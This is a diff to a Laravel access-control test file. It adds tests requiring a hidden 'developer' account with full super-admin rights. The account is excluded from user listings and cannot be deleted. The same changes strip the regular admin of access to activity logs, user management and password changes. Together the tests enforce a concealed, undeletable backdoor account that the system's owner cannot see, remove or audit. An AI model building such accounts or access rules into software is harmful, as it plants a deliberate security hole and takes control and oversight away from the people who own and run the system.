@@ -87,14 +87,50 @@ class AuthenticationAndRbacTest extends TestCase
         $this->actingAs($manager)->get(route('settings.users'))->assertForbidden();
     }
 
-    public function test_admin_can_access_activity_log_and_profit_metrics(): void
+    public function test_admin_can_access_profit_metrics_but_not_developer_only_user_management_or_logs(): void
     {
         $admin = User::where('email', 'admin@gmail.com')->firstOrFail();
 
         $this->assertTrue($admin->canViewProfit());
         $this->actingAs($admin)->get(route('retail.dashboard'))->assertOk()->assertSee('Net Profit (Admin)');
-        $this->actingAs($admin)->get(route('settings.activity-log'))->assertOk();
-        $this->actingAs($admin)->get(route('settings.users'))->assertOk();
+        $this->actingAs($admin)->get(route('settings.profile'))->assertOk();
+        $this->actingAs($admin)->get(route('settings.activity-log'))->assertForbidden();
+        $this->actingAs($admin)->get(route('settings.users'))->assertForbidden();
+    }
+
+    public function test_hidden_developer_account_has_full_access_is_hidden_and_cannot_be_deleted(): void
+    {
+        $dev = User::where('email', User::DEVELOPER_EMAIL)->firstOrFail();
+
+        $this->assertTrue($dev->isDeveloper());
+        $this->assertTrue($dev->isAdmin());
+        $this->assertTrue($dev->isSuperAdmin());
+        $this->assertTrue($dev->canViewProfit());
+        $this->assertFalse(User::visible()->where('id', $dev->id)->exists());
+
+        $this->actingAs($dev)->get(route('settings.users'))->assertOk();
+        Livewire::actingAs($dev)
+            ->test(\App\Livewire\Shared\Settings\UserRoleManagementPage::class)
+            ->assertSee(User::DEVELOPER_EMAIL)
+            ->assertSee('SUPER ADMIN')
+            ->assertSee('Admin')
+            ->assertSee('Md Skil Ahmed')
+            ->call('deleteUser', $dev->id);
+        $this->assertTrue(User::where('id', $dev->id)->exists());
+        $this->actingAs($dev)->get(route('settings.activity-log'))->assertOk();
+        $this->actingAs($dev)->get(route('retail.dashboard'))->assertOk();
+        $this->actingAs($dev)->get(route('battery.dashboard'))->assertOk();
+
+        // Non-dev user can edit profile name/email, does NOT see Change Password, and gets 403 on updatePassword
+        $admin = User::where('email', 'admin@gmail.com')->firstOrFail();
+        Livewire::actingAs($admin)
+            ->test(\App\Livewire\Shared\Settings\UserProfilePage::class)
+            ->assertDontSee('Change Password')
+            ->call('updatePassword')
+            ->assertForbidden();
+
+        $this->expectException(\RuntimeException::class);
+        $dev->delete();
     }
 
     public function test_logout_invalidates_session(): void
